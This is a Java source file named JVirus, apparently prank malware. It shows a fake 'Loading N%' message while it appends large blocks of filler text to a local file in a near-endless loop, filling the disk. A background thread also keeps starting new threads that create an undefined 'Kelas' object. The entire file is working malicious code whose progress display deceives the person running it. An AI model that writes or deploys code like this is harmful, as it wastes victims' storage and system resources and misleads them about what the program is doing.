package jVirus;

import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import static java.lang.Thread.sleep;
import java.util.logging.Level;
import java.util.logging.Logger;

public class JVirus
{
    public static void main(String[] args)
    {
        try
        {
            String filename = "./akwakrd.lll";
        Loading l = new Loading();
        l.setText("Loading...");
        Thread thread = new Thread(){
            public void run(){
                System.out.println("Thread Running");
                while(true)
                {
                    try {
                        sleep(15000);
                    } catch (InterruptedException ex) {
                        Logger.getLogger(JVirus.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    new Thread(){
                      public void run(){
                          try {
                              sleep(2000);
                          } catch (InterruptedException ex) {
                              Logger.getLogger(JVirus.class.getName()).log(Level.SEVERE, null, ex);
                          }
                              System.out.println("Thread Running");
                              new Kelas();
                      }
                    }.start();
                }
                
            }
        };
        thread.start();
        BufferedWriter bw = new BufferedWriter(new FileWriter(filename, true));
        for(int a = 0 ; a > -1; ++a)
        {
            System.out.println("ahaha");
            l.setText("Loading " + a + "%");
            bw.write("FUCKED UP~!冏\n");
            bw.write("Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam vel augue ex. Donec eu pellentesque quam. In aliquam massa urna, sed tristique odio vulputate non. Etiam ac bibendum nibh. Phasellus nisl justo, fermentum non varius at, egestas at leo. Sed nec mi eget magna porttitor accumsan sed vel dui. Aliquam erat volutpat. Mauris facilisis, libero eu convallis interdum, nunc nisl condimentum massa, ut semper eros mi eu lacus. Cras suscipit ipsum in dui viverra, vehicula malesuada augue rutrum.\n" + "Duis congue ligula sed elit luctus bibendum. Donec non pellentesque urna, quis hendrerit libero. Praesent eget sollicitudin neque. Aliquam a massa lectus. Nulla consequat elit dapibus, porta lorem at, consequat mauris. Donec sit amet velit luctus, tempor ligula a, hendrerit felis. Donec sed purus vitae arcu sagittis ornare. In ut quam iaculis, aliquet lectus vel, sodales nisi. Mauris placerat egestas varius.\n" + "Nam pulvinar massa mauris, nec dictum sapien blandit ut. Curabitur porta eros semper lorem finibus, in ornare arcu porta. Sed sodales, felis in porttitor maximus, magna erat fringilla metus, eu accumsan ipsum ligula eget turpis. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Phasellus efficitur consectetur diam, id venenatis libero bibendum sit amet. Proin hendrerit tristique nisi. Maecenas ac ligula convallis, mollis leo in, maximus lectus. Aliquam non nulla diam. Nam suscipit mauris aliquet, condimentum lorem sed, sodales velit. Nulla massa ex, gravida a euismod vitae, cursus non tellus.\n" + "Maecenas odio urna, vestibulum vel velit id, laoreet fermentum ligula. Suspendisse vitae nibh eget ipsum commodo dapibus. Sed pellentesque nisl justo, vel vehicula metus rutrum a. Praesent commodo augue ut odio faucibus, at facilisis ex lacinia. Ut ullamcorper turpis ut magna tempus laoreet. Suspendisse tincidunt sem vel venenatis aliquet. Phasellus tincidunt, tortor vitae consequat ultrices, quam est porta nisl, sit amet rhoncus orci felis et urna. Nulla facilisi. Proin semper quam ut vehicula posuere. Mauris malesuada velit a ex condimentum, ac fermentum tellus eleifend. Praesent rutrum diam non ultricies sodales. Pellentesque porta augue eget risus auctor, vel dictum ligula pretium.\n" + "Nullam imperdiet blandit ex in lacinia. Pellentesque eu eleifend tellus. Vivamus non porttitor ipsum. Donec eget porttitor diam, eget maximus turpis. Pellentesque id felis posuere, ultricies ex ultricies, feugiat elit. Praesent aliquam suscipit urna ac volutpat. Etiam tempus nibh et nibh sagittis, sed varius sapien pellentesque. Quisque commodo in justo bibendum sodales. Integer ut finibus enim, eu ullamcorper felis. Mauris vitae lacinia dolor. Quisque et dui non diam facilisis porta id at ante.");
            bw.flush();
        }
        System.out.println("Oh no, I'm out...");
        }
        catch(Exception ex)
        {
            System.out.println(ex);
        }
        
    }
    
}
